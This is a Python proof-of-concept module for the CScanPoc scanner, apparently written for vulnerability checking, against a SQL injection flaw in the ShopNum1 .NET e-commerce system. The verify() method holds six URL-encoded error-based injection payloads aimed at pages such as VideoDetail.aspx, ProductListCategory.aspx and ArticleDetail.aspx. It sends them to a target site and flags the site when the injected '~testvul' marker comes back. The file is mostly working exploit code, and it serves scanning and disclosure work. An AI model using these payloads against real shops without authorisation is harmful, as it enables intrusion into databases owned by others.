# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'ShopNum1_0001'  # 平台漏洞编号，留空
    name = 'ShopNum1 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-22'  # 漏洞公布时间
    desc = '''
        ShopNum1网店系统是武汉群翔软件有限公司自主研发的基于 WEB 应用的 B/S 架构的B2C网上商店系统，主要面向中高端客户， 为企业和大中型网商打造优秀的电子商务平台，ShopNum1运行于微软公司的 .NET 平台，采用最新的 ASP.NET 3.5技术进行分层开发。拥有更强的安全性、稳定性、易用性。
        ShopNum1 /VideoSearchList.aspx等文件过滤不严格导致高危SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121337'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopNum1'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3bd9b8ad-81e8-42fe-99c6-99ce07dc995e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0121337
            payloads = [
                '/VideoDetail.aspx?Guid=111%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--',
                '/VideoSearchList.aspx?VideoCategoryID=1%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))%3E0--',
                '/ProductListCategory.aspx?ProductCategoryID=1%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))%3E0--',
                '/ArticleDetail.aspx?guid=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--',
                '/ArticleDetailNew.aspx?guid=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--',
                '/HelpList.aspx?Guid=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                req = requests.get(verify_url)

                if req.status_code == 200 and "~testvul" in req.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
